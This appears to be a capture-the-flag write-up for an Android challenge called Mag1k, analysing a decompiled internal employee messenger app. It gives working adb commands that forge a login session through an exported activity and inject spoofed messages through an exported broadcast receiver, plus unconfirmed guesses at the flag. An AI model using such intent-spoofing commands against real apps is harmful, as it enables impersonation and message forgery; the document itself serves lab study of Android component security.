# Mag1k

## Challenge
`Mag1k`

`100`

`ok, you have destroyed everyhting the company is in shambles but nothing malicious right ?`

`NOTE: Use the same app from the first challenge, also you may need a phone 😉`

## Current conclusion
No new literal `csc{...}` flag has been proven for `Mag1k`.

The strongest evidence-backed solve is a cross-app exploit chain:
- forge session state through exported `MessengerActivity`
- abuse exported `ActionReceiver`
- inject internal messages as another employee from outside the app

This is stronger than plain login bypass because it causes visible message spoofing inside employee chats.

## Proven attack surface
### 1. Exported activity session forgery
`MessengerActivity` is exported and trusts caller-controlled `login_user`.

From `MessengerActivity.java`:
- reads `getIntent().getExtras().getString("login_user")`
- writes `PrepareData.logged_in_user = string`
- calls `PrepareData.PrepareCollection(...)`
- does not validate any real session token

### 2. Exported receiver abuse
`ActionReceiver` is exported in the manifest and handles:
- `com.blindsec.SEND_MESSAGE`
- `com.blindsec.AUTH_SEND_MESSAGE`
- hidden listener action used in the previous challenge

From `ActionReceiver.java`:
- `SEND_MESSAGE` calls `PrepareData.Sendmessage(...)` if `PrepareData.logged_in_user != null`
- `AUTH_SEND_MESSAGE` uses a legacy hardcoded credential path, omitted here
- then sets `PrepareData.logged_in_user`, rebuilds collections, and sends a message

### 3. Dynamic receiver registration
`LoginActivity` also dynamically registers the same `ActionReceiver` for:
- `com.blindsec.SEND_MESSAGE`
- `com.blindsec.SEND_PROJECT`
- `com.blindsec.AUTH_SEND_MESSAGE`
- the hidden listener action

`SEND_PROJECT` appears in registration, but there is no handling branch for it in `ActionReceiver.java`.

## Runtime proofs
Recommended place to run terminal commands:

```bash
cd ~
```

The commands work from any terminal directory, but `cd ~` keeps things clean.

### Proof 1: direct activity launch bypass
```bash
cd ~
adb shell 'am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Alexandros Charalampidis"'
```

Observed:
- Messenger opens directly as `Alexandros Charalampidis`
- no password prompt
- chats become accessible as the forged user

### Proof 2: cold-start exported receiver can inject a message
```bash
cd ~
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.AUTH_SEND_MESSAGE --es TO "<recipient>" --es Message "coldstart_auth_probe" --es username "<redacted>" --es password "<redacted>"'
```

Then:
```bash
cd ~
adb shell 'am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Christos Markatos"'
```

Observed:
- the injected message appears in Christos <-> Petros chat
- this works from a cold start through the exported receiver alone

### Proof 3: forged session plus exported receiver can spoof messages
```bash
cd ~
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Alexandros Charalampidis"; sleep 2; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.SEND_MESSAGE --es TO "Petros Papadopoulos" --es Message "explicit_send_probe" --es login_user "Alexandros Charalampidis"'
```

Observed:
- `explicit_send_probe` appears in Alexandros <-> Petros chat
- this proves impersonation plus arbitrary internal message injection from outside the app

### Negative proof: unauthenticated `SEND_MESSAGE` does not mutate state
```bash
cd ~
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.SEND_MESSAGE --es TO "Petros Papadopoulos" --es Message "unauth_probe" --es login_user "Alexandros Charalampidis"'
```

Observed:
- no injected message appears
- `SEND_MESSAGE` alone needs session state

### Negative proof: `SEND_PROJECT` is inert
```bash
cd ~
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.SEND_PROJECT --es TO "<recipient>" --es Message "project_probe" --es username "<redacted>" --es password "<redacted>" --es project "MessengerExploit"'
```

Observed:
- no `project_probe` message appears
- no code branch in `ActionReceiver.java` handles `SEND_PROJECT`

## What was searched
Searched for any Mag1k-specific literal flag in:
- `/tmp/message-received-jadx/sources`
- `/tmp/message-received-jadx/resources`
- local unpacked challenge artifacts
- local decrypted message output

Result:
- only the already-solved challenge 2 flag exists in decrypted messages
- no new proven `Mag1k` literal flag was found

## Strongest candidate submission strings
These are evidence-backed candidates only. They are not yet platform-confirmed.

1. `Cross-app message injection via exported ActionReceiver after forged login_user session in exported MessengerActivity`
2. `Unauthorized internal message spoofing via exported ActionReceiver and forged MessengerActivity session`
3. `Employee impersonation and message injection through exported MessengerActivity and ActionReceiver`
4. `Arbitrary internal message injection by combining exported MessengerActivity with exported ActionReceiver`

## Likely intended solve type
Most likely:
- not a hidden literal flag
- not just generic auth bypass
- a malicious helper-app / phone-based cross-app exploit that lets the attacker impersonate employees and inject internal messages

## Relevant files
- `/tmp/message-received-jadx/resources/AndroidManifest.xml`
- `/tmp/message-received-jadx/sources/com/blindsec/internalemployeemessenger/MessengerActivity.java`
- `/tmp/message-received-jadx/sources/com/blindsec/internalemployeemessenger/ActionReceiver.java`
- `/tmp/message-received-jadx/sources/com/blindsec/internalemployeemessenger/ui/login/LoginActivity.java`
- `/tmp/message-received-jadx/sources/com/blindsec/internalemployeemessenger/data/PrepareData.java`
- redacted local decrypted-message output
- [runtime_tests.md](runtime_tests.md)
